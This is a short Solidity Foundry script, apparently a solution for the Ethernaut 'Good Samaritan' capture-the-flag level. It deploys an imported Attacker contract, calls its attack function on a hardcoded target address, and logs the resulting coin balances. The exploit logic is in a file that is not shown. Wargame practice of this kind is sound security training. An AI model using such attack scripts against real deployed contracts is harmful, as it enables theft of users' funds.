// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Attacker.sol";

contract GoodSamaritanScript is Script {
    address goodSamaritanAddress = 0x93EaA467e3AF0a94799CbA7E72725ec3eE0797d3;
    

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address EOA = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker();
        attacker.attack(goodSamaritanAddress);
        GoodSamaritan goodSamaritan = GoodSamaritan(goodSamaritanAddress);
        Coin coin = Coin(goodSamaritan.coin());
        console2.log(coin.balances(address(attacker)));
        console2.log(coin.balances(goodSamaritanAddress));
        
        vm.stopBroadcast();
    }
}
